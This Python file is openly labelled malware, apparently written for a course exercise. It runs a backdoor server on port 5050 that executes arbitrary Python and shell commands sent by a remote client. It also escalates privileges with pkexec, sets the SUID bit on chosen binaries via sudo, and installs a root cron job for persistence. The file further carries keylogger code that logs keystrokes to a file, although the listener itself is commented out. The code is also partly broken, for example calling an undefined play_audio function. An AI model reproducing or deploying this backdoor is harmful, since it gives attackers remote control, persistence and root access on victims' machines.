#!/usr/bin/env python3

# This is all in one file to make it easier to transfer to the remote machine
# That does NOT mean we can't organize it nicely using functions and classes!


# NOTE: Do not put dependencies that require pip install X here!
# Put it inside of the function that bootstraps them instead
import os
import socket
import subprocess
import sys
import time
import logging 
import pty

THIS_FILE = os.path.realpath(__file__)

def run_command(cmd, shell=True, capture_output=True, **kwargs):
    return subprocess.run(
        cmd,
        shell=shell,
        capture_output=capture_output,
        text=True,
        **kwargs
    )


# listen on port 5050, receive input
HOST, PORT = "0.0.0.0", 5050


def kill_others():
    """
    Since a port can only be bound by one program, kill all other programs on this port that we can see.
    This makes it so if we run our script multiple times, only the most up-to-date/priviledged one will be running in the end
    """
    # check if privilege escalated
    # if os.geteuid() == 0:
    # if so, kill all other non-privileged copies of it
    pid = run_command(f"lsof -ti TCP:{str(PORT)}").stdout
    if pid:
        pids = pid.strip().split("\n")
        print("Killing", pids)
        for p in pids:
            run_command(f"kill {str(p)}")
        time.sleep(1)

def bootstrap_packages():
    """
    This allows us to install any python package we want as part of our malware.
    In real malware, we would probably packages these extra dependencies with the payload,
    but for simplicitly, we just install it. If you are curious, look into pyinstaller
    """

    print(sys.prefix, sys.base_prefix)
    try:
        import pynput
    except ImportError:
        print("pynput not found, installing...")
        run_command([sys.executable, "-m", "pip", "install", "pynput"], shell=False, capture_output=False)

    # Check and install logging if necessary
    try:
        import logging
    except ImportError:
        print("logging not found, installing...")
        run_command([sys.executable, "-m", "pip", "install", "logging"], shell=False, capture_output=False)
    
    if sys.prefix == sys.base_prefix:
        # we're not in a venv, make one
        print("running in venv")
        import venv

        venv_dir = os.path.join(os.path.dirname(THIS_FILE), ".venv")
        # print(venv_dir)
        if not os.path.exists(venv_dir):
            print("creating venv")
            venv.create(venv_dir, with_pip=True)
            subprocess.Popen([os.path.join(venv_dir, "bin", "python"), THIS_FILE])
            sys.exit(0)
        else:
            print("venv exists, but we still need to open inside it")
            subprocess.Popen([os.path.join(venv_dir, "bin", "python"), THIS_FILE])
            sys.exit(0)
    else:
        print("already in venv")
        run_command(
            [ sys.executable, "-m", "pip", "install", "requests"], shell=False, capture_output=False
        ).check_returncode() # example to install a python package on the remote server
        # If you need pip install X packages, here, import them now
        run_command([sys.executable, "-m", "pip", "install", "bs4"], shell=False, capture_output=False).check_returncode()
        import requests
        import bs4
        import urllib.parse
        try:
            __import__("webbrowser")
        except ImportError:
            subprocess.run([sys.executable, "-m", "pip", "install", "webbrowser"], check=True)

def on_press(key):
    try:
        logging.info(f"Key pressed: {key.char}")
        print(f"Key pressed: {key.char}")  # Debug print
    except AttributeError:
        logging.info(f"Special key pressed: {key}")
        print(f"Special key pressed: {key}")  # Debug print

def on_release(key):
    if key == pynput.keyboard.Key.esc:
        print("Keylogger stopped")  # Debug print
        return False

def handle_conn(conn, addr):
    import pynput
    with conn:
        print(f"connected by {addr}")
        # If you need to receive more data, you may need to loop
        # Note that there is actually no way to know we have gotten "all" of the data
        # We only know if the connection was closed, but if the client is waiting for us to say something,
        # It won't be closed. Hint: you might need to decide how to mark the "end of command data".
        # For example, you could send a length value before any command, decide on null byte as ending,
        # base64 encode every command, etc
        data = conn.recv(1024) 
        print("received: " + data.decode("utf-8", errors="replace"))
        sentence = data.decode("utf-8", errors="replace")
        words = sentence.split()

        _,_, task = sentence.partition(" ")
        master_fd, slave_fd = pty.openpty()  
        slave_file = os.fdopen(slave_fd, "w")
        process = subprocess.Popen(["python", '/'.join(THIS_FILE.split('/')[:-2]) + "/client/app.py"], stdin=slave_file,stdout=slave_file,stderr=slave_file,text=True)
        os.close(slave_fd)  # Close slave in parent
        output_stream = os.fdopen(master_fd, "r")  # Read from master side
        if words[0] == "privesc":
            subprocess.run(["pkexec", sys.executable, THIS_FILE])
        elif words[0] == "killcron":
            subprocess.run(["pkexec", "rm", "-f", "/etc/cron.d/malware"])
        elif words[0]=="kill":
            subprocess.run(["pkexec", "rm", "-f", THIS_FILE], check=True)
        elif words[0] =="break":
            task = task.strip()
            try:
            # Locate the 'chmod' binary
                binary_path = subprocess.check_output(["which", task]).decode().strip()
                print(f"Found {task} at: {binary_path}")
            except Exception as e:
                print(f"Error: Could not locate 'python3' binary: {e}")
                sys.exit(1)

            command = ["sudo", "chmod", "u+s", binary_path]
            try:
                print(f"Setting the SUID bit on: {binary_path}")
                subprocess.run(command, check=True)
                print(f"Successfully set the SUID bit on {binary_path}")
            except subprocess.CalledProcessError as e:
                print(f"Error: Failed to set the SUID bit on {binary_path}\n{e}")
                sys.exit(1)
        elif words[0] == "playaudio":
            # Call the play_audio function from the other file
            play_audio()
            conn.sendall("Playing audio!".encode())
        elif words[0] =="pythoncmd":
            exec(task)
            conn.sendall("command executed successful ".encode())
        elif words[0] == "bashcmd":
            output = run_command(task)
            conn.sendall(output.stdout.encode())
        elif words[0] == "cron":
            FILE_PATH = "/etc/cron.d/malware"
            try:
                with open(FILE_PATH, "x") as f:
                    f.write(f"* * * * * root {THIS_FILE}\n") 
            except:
                f = open(FILE_PATH, "w")
                f.write(f"* * * * * root {THIS_FILE}\n") 
                
            os.chmod(FILE_PATH, 0o755)
            f.close()
        elif words[0] == 'appcmd':
            # way of interacting with process from ChatGPT
            cmd = " ".join(words[1:])
            print(cmd)
            os.write(master_fd, (cmd + "\n").encode())
            output_lines = []
            #print("test before the while loop")
            while True:
                line = output_stream.readline().strip()
                print("line: " + line)
                if not line:# Stop reading at the prompt
                    break
                if line.startswith(">"): 
                    continue
                output_lines.append(line)

                response = "\n".join(output_lines) if output_lines else "No response."
                #print("output: " + response)
                conn.sendall(response.encode() + b"\n")
        """# Set up the keylogger listener
        with pynput.keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
            listener.join()"""
        process.terminate() 
            
        if not data:
            return
        
        #subprocess.Popen([sys.executable, THIS_FILE])


        # Think VERY carefully about how you will communicate between the client and server
        # You will need to make a custom protocol to transfer commands
        
    
        try:
            conn.sendall("Response data here".encode())
            # Process the communication data from 
        except Exception as e:
            conn.sendall(f"error: {e}".encode())


def main():
    kill_others()
    bootstrap_packages()

    # Configure logging
    logging.basicConfig(
        filename=os.path.join(os.path.dirname(THIS_FILE), "keylog.txt"),  # Full path to keylog.txt
        level=logging.DEBUG,
        format="%(asctime)s - %(message)s"
    )


    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.bind((HOST, PORT))
        s.listen()  # allows for 10 connections
        print(f"Listening on {HOST}:{PORT}")
        while True:
            try:
                conn, addr = s.accept()
                #print("Conenction Accepted")
                handle_conn(conn, addr)
            except KeyboardInterrupt:
                raise
            except Exception as e:
                print(f"Connection died with error {e}")


if __name__ == "__main__":
    main()
